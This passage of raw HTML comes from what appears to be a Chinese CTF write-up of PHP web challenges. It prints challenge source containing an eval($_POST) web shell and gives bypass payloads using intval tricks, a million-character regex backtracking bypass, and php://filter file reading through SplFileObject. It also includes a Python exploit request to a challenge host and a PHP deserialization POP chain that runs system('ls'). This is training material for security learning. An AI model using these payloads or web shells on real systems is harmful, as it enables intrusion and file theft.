class=\"keyword\">if</span> (<span class=\"title function_ invoke__\">preg_match</span>(<span class=\"string\">&#x27;/.+?HACKER/is&#x27;</span>,<span class=\"variable\">$try</span>))&#123;</span><br><span class=\"line\">        <span class=\"keyword\">die</span>(<span class=\"string\">&quot;你是hacker还敢自报家门呢？&quot;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (!<span class=\"title function_ invoke__\">stripos</span>(<span class=\"variable\">$try</span>,<span class=\"string\">&#x27;HACKER&#x27;</span>) === <span class=\"literal\">TRUE</span>)&#123;</span><br><span class=\"line\">        <span class=\"keyword\">die</span>(<span class=\"string\">&quot;你连自己是hacker都不承认，还想要flag呢？&quot;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"variable\">$a</span>=<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;a&#x27;</span>];</span><br><span class=\"line\">    <span class=\"variable\">$b</span>=<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;b&#x27;</span>];</span><br><span class=\"line\">    <span class=\"variable\">$c</span>=<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;c&#x27;</span>];</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(<span class=\"title function_ invoke__\">stripos</span>(<span class=\"variable\">$b</span>,<span class=\"string\">&#x27;php&#x27;</span>)!==<span class=\"number\">0</span>)&#123;</span><br><span class=\"line\">        <span class=\"keyword\">die</span>(<span class=\"string\">&quot;收手吧hacker，你得不到flag的！&quot;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">echo</span> (<span class=\"keyword\">new</span> <span class=\"variable\">$a</span>(<span class=\"variable\">$b</span>))-&gt;<span class=\"variable\">$c</span>();</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">else</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"keyword\">die</span>(<span class=\"string\">&quot;114514到底是啥意思嘞？。？&quot;</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"comment\"># 觉得困难的话就直接把shell拿去用吧，不用谢~</span></span><br><span class=\"line\"><span class=\"variable\">$shell</span>=<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;shell&#x27;</span>];</span><br><span class=\"line\"><span class=\"keyword\">eval</span>(<span class=\"variable\">$shell</span>);</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n\n<h3 id=\"第一部分\"><a href=\"#第一部分\" class=\"headerlink\" title=\"第一部分\"></a>第一部分</h3><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span>(<span class=\"variable\">$emp</span>!=<span class=\"string\">&quot;114514&quot;</span>&amp;&amp;<span class=\"title function_ invoke__\">intval</span>(<span class=\"variable\">$emp</span>,<span class=\"number\">0</span>)===<span class=\"number\">114514</span>)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"keyword\">for</span> (<span class=\"variable\">$i</span>=<span class=\"number\">0</span>;<span class=\"variable\">$i</span>&lt;<span class=\"title function_ invoke__\">strlen</span>(<span class=\"variable\">$emp</span>);<span class=\"variable\">$i</span>++)&#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (<span class=\"title function_ invoke__\">ctype_alpha</span>(<span class=\"variable\">$emp</span>[<span class=\"variable\">$i</span>]))&#123;</span><br><span class=\"line\">            <span class=\"keyword\">die</span>(<span class=\"string\">&quot;你不是hacker？那请去外场等候！&quot;</span>);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">echo</span> <span class=\"string\">&quot;只有真正的hacker才能拿到flag！&quot;</span>.<span class=\"string\">&quot;&lt;br&gt;&quot;</span>;</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"非法字符转化规则\"><a href=\"#非法字符转化规则\" class=\"headerlink\" title=\"非法字符转化规则\"></a>非法字符转化规则</h4><p>e_m.p -&gt;e[m.p</p>\n<h4 id=\"intval和ctype-alpha绕过\"><a href=\"#intval和ctype-alpha绕过\" class=\"headerlink\" title=\"intval和ctype_alpha绕过\"></a>intval和ctype_alpha绕过</h4><p><strong>GET: e[m.p&#x3D;114514.1</strong> </p>\n<blockquote>\n<p>114514a会被ctype_alpha检查，不可用</p>\n</blockquote>\n<h3 id=\"第二部分\"><a href=\"#第二部分\" class=\"headerlink\" title=\"第二部分\"></a>第二部分</h3><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span> (<span class=\"title function_ invoke__\">preg_match</span>(<span class=\"string\">&#x27;/.+?HACKER/is&#x27;</span>,<span class=\"variable\">$try</span>))&#123;</span><br><span class=\"line\">       <span class=\"keyword\">die</span>(<span class=\"string\">&quot;你是hacker还敢自报家门呢？&quot;</span>);</span><br><span class=\"line\">   &#125;</span><br><span class=\"line\">   <span class=\"keyword\">if</span> (!<span class=\"title function_ invoke__\">stripos</span>(<span class=\"variable\">$try</span>,<span class=\"string\">&#x27;HACKER&#x27;</span>) === <span class=\"literal\">TRUE</span>)&#123;</span><br><span class=\"line\">       <span class=\"keyword\">die</span>(<span class=\"string\">&quot;你连自己是hacker都不承认，还想要flag呢？&quot;</span>);</span><br><span class=\"line\">   &#125;</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"preg-match和-stripos组合！！！长度绕过\"><a href=\"#preg-match和-stripos组合！！！长度绕过\" class=\"headerlink\" title=\"preg_match和!stripos组合！！！长度绕过\"></a>preg_match和!stripos组合！！！长度绕过</h4><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">a=<span class=\"string\">&#x27;*&#x27;</span></span><br><span class=\"line\">b=<span class=\"string\">&#x27;HACKER&#x27;</span></span><br><span class=\"line\"><span class=\"built_in\">print</span>(a*<span class=\"number\">1000001</span>+b)</span><br></pre></td></tr></table></figure>\n\n<blockquote>\n<p>ps:长度绕过一般为一百万位，建议使用bp重发器发送</p>\n</blockquote>\n<h3 id=\"第三部分\"><a href=\"#第三部分\" class=\"headerlink\" title=\"第三部分\"></a>第三部分</h3><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">    <span class=\"variable\">$a</span>=<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;a&#x27;</span>];</span><br><span class=\"line\">    <span class=\"variable\">$b</span>=<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;b&#x27;</span>];</span><br><span class=\"line\">    <span class=\"variable\">$c</span>=<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;c&#x27;</span>];</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(<span class=\"title function_ invoke__\">stripos</span>(<span class=\"variable\">$b</span>,<span class=\"string\">&#x27;php&#x27;</span>)!==<span class=\"number\">0</span>)&#123;</span><br><span class=\"line\">        <span class=\"keyword\">die</span>(<span class=\"string\">&quot;收手吧hacker，你得不到flag的！&quot;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">echo</span> (<span class=\"keyword\">new</span> <span class=\"variable\">$a</span>(<span class=\"variable\">$b</span>))-&gt;<span class=\"variable\">$c</span>();</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">else</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"keyword\">die</span>(<span class=\"string\">&quot;114514到底是啥意思嘞？。？&quot;</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"PHP原生类之SplFileObject\"><a href=\"#PHP原生类之SplFileObject\" class=\"headerlink\" title=\"PHP原生类之SplFileObject\"></a>PHP原生类之SplFileObject</h4><p><strong>GET:a&#x3D;SplFileObject&amp;b&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-</strong><br><strong>encode&#x2F;resource&#x3D;flag.php&amp;c&#x3D;__toString</strong></p>\n<blockquote>\n<p>c&#x3D;__toString是让echo触发__toString方法</p>\n</blockquote>\n<h3 id=\"EXP\"><a href=\"#EXP\" class=\"headerlink\" title=\"EXP\"></a>EXP</h3><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> requests</span><br><span class=\"line\">res = requests.post(<span class=\"string\">&quot;http://gz.imxbt.cn:20214/?e[m.p=114514.1&amp;a=SplFileObject&amp;b=php://filter/convert.base64-encode/resource=flag.php&amp;c=__tostring&quot;</span>, data=&#123;<span class=\"string\">&#x27;try&#x27;</span>: <span class=\"string\">&#x27;-&#x27;</span> * <span class=\"number\">1000001</span> + <span class=\"string\">&#x27;HACKER&#x27;</span>&#125;)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(res.text)</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"Really-EZ-POP\"><a href=\"#Really-EZ-POP\" class=\"headerlink\" title=\"Really EZ POP\"></a>Really EZ POP</h2><p>pop链很好构造</p>\n<p>exp</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Sink</span></span></span><br><span class=\"line\"><span class=\"class\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"variable\">$cmd</span> = <span class=\"string\">&#x27;system(&quot;ls&quot;);&#x27;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Shark</span></span></span><br><span class=\"line\"><span class=\"class\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"variable\">$word</span>;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">setWord</span>(<span class=\"params\"><span class=\"variable\">$word</span></span>) //1 $<span class=\"title\">Si</span></span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;word = <span class=\"variable\">$word</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Sea</span></span></span><br><span class=\"line\"><span class=\"class\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$animal</span>; <span class=\"comment\">//2 $Sh</span></span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Nature</span></span></span><br><span class=\"line\"><span class=\"class\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$sea</span>;  <span class=\"comment\">//3 $Se</span></span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"variable\">$Si</span>=<span class=\"keyword\">new</span> <span class=\"title class_\">Sink</span>;</span><br><span class=\"line\"><span class=\"variable\">$Sh</span>=<span class=\"keyword\">new</span> <span class=\"title class_\">Shark</span>;</span><br><span class=\"line\"><span class=\"variable\">$Se</span>=<span class=\"keyword\">new</span> <span class=\"title class_\">Sea</span>;</span><br><span class=\"line\"><span class=\"variable\">$N</span>=<span class=\"keyword\">new</span> <span class=\"title class_\">Nature</span>;</span><br><span class=\"line\"><span class=\"variable\">$Sh</span> -&gt;<span class=\"title function_ invoke__\">setWord</span>(<span class=\"variable\">$Si</span>);</span><br><span class=\"line\"><span class=\"variable\">$Se</span> -&gt;animal=<span class=\"variable\">$Sh</span>;</span><br><span class=\"line\"><span class=\"variable\">$N</span> -&gt;sea=<span class=\"variable\">$Se</span>;</span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"title function_ invoke__\">serialize</span>(<span class=\"variable\">$N</span>);</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"php类中的私有属性\"><a href=\"#php类中的私有属性\" class=\"headerlink\" title=\"php类中的私有属性\"></a>php类中的私有属性</h3><p>考点，是低版本的php类中的<strong>私有属性</strong>进行序列化的方法</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Shark</span></span></span><br><span class=\"line\"><span class=\"class\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"variable\">$word</span>;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">setWord</span>(<span class=\"params\"><span class=\"variable\">$word</span></span>) //1 $<span class=\"title\">Si</span></span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;word = <span class=\"variable\">$word</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>在Shark中的私有属性word直接使用<code>$Sh -&gt;word=$Si;</code>会报错，需要自己构造一个方法，在这里是<strong>setword</strong>,构造链子时改为<code>$Sh -&gt;setWord($Si);</code>即可，其他方法不变</p>\n<h2 id=\"玩原神玩的\"><a href=\"#玩原神玩的\" class=\"headerlink\" title=\"玩原神玩的\"></a>玩原神玩的</h2><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"title function_ invoke__\">highlight_file</span>(<span class=\"keyword\">__FILE__</span>);</span><br><span class=\"line\"><span class=\"title function_ invoke__\">error_reporting</span>(<span class=\"number\">0</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">include</span> <span class=\"string\">&#x27;flag.php&#x27;</span>;</span><br><span class=\"line\"><span class=\"keyword\">if</span> (<span class=\"title function_ invoke__\">sizeof</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;len&#x27;</span>]) == <span class=\"title function_ invoke__\">sizeof</span>(<span class=\"variable\">$array</span>)) &#123;</span><br><span class=\"line\">  <span class=\"title function_ invoke__\">ys_open</span>(<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;tip&#x27;</span>]);</span><br><span class=\"line\">&#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">  <span class=\"keyword\">die</span>(<span class=\"string\">&quot;错了！就你还想玩原神？❌❌❌&quot;</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">ys_open</span>(<span class=\"params\"><span class=\"variable\">$tip</span></span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (<span class=\"variable\">$tip</span> != <span class=\"string\">&quot;我要玩原神&quot;</span>) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">die</span>(<span class=\"string\">&quot;我不管，我要玩原神！😭😭😭&quot;</span>);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"title function_ invoke__\">dumpFlag</span>();</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">dumpFlag</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (!<span class=\"keyword\">isset</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;m&#x27;</span>]) || <span class=\"title function_ invoke__\">sizeof</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;m&#x27;</span>]) != <span class=\"number\">2</span>) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">die</span>(<span class=\"string\">&quot;可恶的QQ人！😡😡😡&quot;</span>);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"variable\">$a</span> = <span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;m&#x27;</span>][<span class=\"number\">0</span>];</span><br><span class=\"line\">  <span class=\"variable\">$b</span> = <span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;m&#x27;</span>][<span class=\"number\">1</span>];</span><br><span class=\"line\">  <span class=\"keyword\">if</span>(<span class=\"keyword\">empty</span>(<span class=\"variable\">$a</span>) || <span class=\"keyword\">empty</span>(<span class=\"variable\">$b</span>) || <span class=\"variable\">$a</span> != <span class=\"string\">&quot;100%&quot;</span> || <span class=\"variable\">$b</span> != <span class=\"string\">&quot;love100%&quot;</span> . <span class=\"title function_ invoke__\">md5</span>(<span class=\"variable\">$a</span>)) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">die</span>(<span class=\"string\">&quot;某站崩了？肯定是某忽悠干的！😡😡😡&quot;</span>);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">include</span> <span class=\"string\">&#x27;flag.php&#x27;</span>;</span><br><span class=\"line\">  <span class=\"variable\">$flag</span>[] = <span class=\"keyword\">array</span>();</span><br><span class=\"line\">  <span class=\"keyword\">for</span> (<span class=\"variable\">$ii</span> = <span class=\"number\">0</span>;<span class=\"variable\">$ii</span> &lt; <span class=\"title function_ invoke__\">sizeof</span>(<span class=\"variable\">$array</span>);<span class=\"variable\">$ii</span>++) &#123;</span><br><span class=\"line\">    <span class=\"variable\">$flag</span>[<span class=\"variable\">$ii</span>] = <span class=\"title function_ invoke__\">md5</span>(<span class=\"title function_ invoke__\">ord</span>(<span class=\"variable\">$array</span>[<span class=\"variable\">$ii</span>]) ^ <span class=\"variable\">$ii</span>);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  </span><br><span class=\"line\">  <span class=\"keyword\">echo</span> <span class=\"title function_ invoke__\">json_encode</span>(<span class=\"variable\">$flag</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"第一部分-1\"><a href=\"#第一部分-1\" class=\"headerlink\" title=\"第一部分\"></a>第一部分</h3><h4 id=\"sizeof-POST-‘len’-sizeof-array\"><a href=\"#sizeof-POST-‘len’-sizeof-array\" class=\"headerlink\" title=\"sizeof($_POST[‘len’]) &#x3D;&#x3D; sizeof($array)\"></a>sizeof($_POST[‘len’]) &#x3D;&#x3D; sizeof($array)</h4><p>可以先在本地看一下<code>sizeof($_POST[&#39;len&#39;])</code>的返回值是什么</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"keyword\">if</span> (<span class=\"keyword\">isset</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;len&#x27;</span>])) &#123;</span><br><span class=\"line\">    <span class=\"variable\">$lenCount</span> = <span class=\"title function_ invoke__\">sizeof</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;len&#x27;</span>]);</span><br><span class=\"line\">    <span class=\"keyword\">echo</span> <span class=\"string\">&quot;Length of len array: &quot;</span> . <span class=\"variable\">$lenCount</span>; <span class=\"comment\">// 应该输出 45</span></span><br><span class=\"line\">&#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">echo</span> <span class=\"string\">&quot;&#x27;len&#x27; parameter is not set.&quot;</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/post/%E8%B5%9B%E4%BA%8B%E6%80%BB%E7%BB%93/image-20241013150514357.png\" alt=\"image-20241013150514357\"></p>\n<p>可见<strong>POST传几次len返回值就是几</strong></p>\n<p>这里并不知道<code>sizeof($array)</code>长度是多少，进行爆破试出来是45，payload:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">POST:</span><br><span class=\"line\">len[]=0&amp;len[]=1&amp;len[]=2&amp;len[]=3&amp;len[]=4&amp;len[]=5&amp;len[]=6&amp;len[]=7&amp;len[]=8&amp;len[]=9&amp;len[]=10&amp;len[]=11&amp;len[]=12&amp;len[]=13&amp;len[]=14&amp;len[]=15&amp;len[]=16&amp;len[]=17&amp;len[]=18&amp;len[]=19&amp;len[]=20&amp;len[]=21&amp;len[]=22&amp;len[]=23&amp;len[]=24&amp;len[]=25&amp;len[]=26&amp;len[]=27&amp;len[]=28&amp;len[]=29&amp;len[]=30&amp;len[]=31&amp;len[]=32&amp;len[]=33&amp;len[]=34&amp;len[]=35&amp;len[]=36&amp;len[]=37&amp;len[]=38&amp;len[]=39&amp;len[]=40&amp;len[]=41&amp;len[]=42&amp;len[]=43&amp;len[]=44</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"第二部分-1\"><a href=\"#第二部分-1\" class=\"headerlink\" title=\"第二部分\"></a>第二部分</h3><p>过于简单，直接给payload</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">GET:</span><br><span class=\"line\">?tip=我要玩原神</span><br><span class=\"line\">POST:</span><br><span class=\"line\">len[]=0&amp;len[]=1&amp;len[]=2&amp;len[]=3&amp;len[]=4&amp;len[]=5&amp;len[]=6&amp;len[]=7&amp;len[]=8&amp;len[]=9&amp;len[]=10&amp;len[]=11&amp;len[]=12&amp;len[]=13&amp;len[]=14&amp;len[]=15&amp;len[]=16&amp;len[]=17&amp;len[]=18&amp;len[]=19&amp;len[]=20&amp;len[]=21&amp;len[]=22&amp;len[]=23&amp;len[]=24&amp;len[]=25&amp;len[]=26&amp;len[]=27&amp;len[]=28&amp;len[]=29&amp;len[]=30&amp;len[]=31&amp;len[]=32&amp;len[]=33&amp;len[]=34&amp;len[]=35&amp;len[]=36&amp;len[]=37&amp;len[]=38&amp;len[]=39&amp;len[]=40&amp;len[]=41&amp;len[]=42&amp;len[]=43&amp;len[]=45&amp;m[0]=100%25&amp;m[1]=love100%2530bd7ce7de206924302499f197c7a966</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"第三部分-1\"><a href=\"#第三部分-1\" class=\"headerlink\" title=\"第三部分\"></a>第三部分</h3><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"> <span class=\"keyword\">include</span> <span class=\"string\">&#x27;flag.php&#x27;</span>;</span><br><span class=\"line\">  <span class=\"variable\">$flag</span>[] = <span class=\"keyword\">array</span>();</span><br><span class=\"line\">  <span class=\"keyword\">for</span> (<span class=\"variable\">$ii</span> = <span class=\"number\">0</span>;<span class=\"variable\">$ii</span> &lt; <span class=\"title function_ invoke__\">sizeof</span>(<span class=\"variable\">$array</span>);<span class=\"variable\">$ii</span>++) &#123;</span><br><span class=\"line\">    <span class=\"variable\">$flag</span>[<span class=\"variable\">$ii</span>] = <span class=\"title function_ invoke__\">md5</span>(<span class=\"title function_ invoke__\">ord</span>(<span class=\"variable\">$array</span>[<span class=\"variable\">$ii</span>]) ^ <span class=\"variable\">$ii</span>);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  </span><br><span class=\"line\">  <span class=\"keyword\">echo</span> <span class=\"title function_ invoke__\">json_encode</span>(<span class=\"variable\">$flag</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>将输出的密文进行解密</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"variable\">$md5</span> = [</span><br><span class=\"line\">    <span class=\"string\">&quot;3295c76acbf4caaed33c36b1b5fc2cb1&quot;</span>, <span class=\"string\">&quot;26657d5ff9020d2abefe558796b99584&quot;</span>,</span><br><span class=\"line\">    <span class=\"string\">&quot;73278a4a86960eeb576a8fd4c9ec6997&quot;</span>, <span class=\"string\">&quot;ec8956637a99787bd197eacd77acce5e&quot;</span>,</span><br><span class=\"line\">    <span 